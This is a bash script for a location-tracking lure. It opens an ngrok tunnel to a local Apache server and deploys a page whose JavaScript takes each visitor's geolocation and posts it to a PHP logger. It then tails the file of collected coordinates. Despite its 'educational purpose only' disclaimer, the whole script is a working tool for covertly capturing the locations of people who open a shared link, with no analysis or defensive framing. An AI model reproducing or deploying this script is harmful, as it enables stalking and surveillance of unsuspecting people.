#!/bin/bash

########################################
# Educational purpose only             #
########################################
# I'm not responsible for your actions #

########################################

#64_bit
#xterm -e ./ngrok_64 http 80 & clear

#32_Bit
xterm -e ./ngrok http 80 & clear


echo "            ______________________________________________________   
            7      77  _  77  _  77     77  7  77  7  77  _  77  7   
            !__  __!|    _||  _  ||  ___!|   __!|  |  ||    _||  |   
              7  7  |  _ \ |  7  ||  7___|     ||  |  ||  _ \ |  !___
              |  |  |  7  ||  |  ||     7|  7  ||  !  ||  7  ||     7
              !__!  !__!__!!__!__!!_____!!__!__!!_____!!__!__!!_____!
                                                                     "

#sleep 5
#read -p '           URL: ' varurl

echo "<!DOCTYPE html>

<html>
    <head>
        <title>Z-HACKER</title>
        <style type=\"text/css\">
            
            body {
                background-image: url(\"Anonymous.jpg\");
                background-size: 1000px 1600px;
                background-repeat: no-repeat;
            }

        </style>
    </head>
    <body>

        <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js\" type='text/javascript' ></script>
        <script type='text/javascript'>

        navigator.geolocation.getCurrentPosition(position)
            function position(pos){
                $.post(\"saver.php\", {\"lat\": pos.coords.latitude, \"lng\": pos.coords.longitude}, function(code){
                    console.log(code)
                })
            
            };
        
        
        </script>
    </body>
</html>" > index.html

echo "<?php
    print_r("'$_POST'");
    "'$a'" = fopen(\"save.txt\", \"a\");
    fwrite("'$a'", \"Location: "'$_POST[lat]'" "'$_POST[lng]'"
==============================\");
    fclose("'$a'");
?>" > saver.php

mv index.html /var/www/html/index.html
mv saver.php /var/www/html/saver.php
cp Anonymous.jpg /var/www/html/Anonymous.jpg

service apache2 start

#echo "   #      ______________________________________________________   
         #7      77  _  77  _  77     77  7  77  7  77  _  77  7   
         #!__  __!|    _||  _  ||  ___!|   __!|  |  ||    _||  |   
          # 7  7  |  _ \ |  7  ||  7___|     ||  |  ||  _ \ |  !___
           #|  |  |  7  ||  |  ||     7|  7  ||  !  ||  7  ||     7
           #!__!  !__!__!!__!__!!_____!!__!__!!_____!!__!__!!_____!
                                                                  #" > /var/log/apache2/access.log
xterm -e tail -f /var/www/html/save.txt #&
#clear

#exit
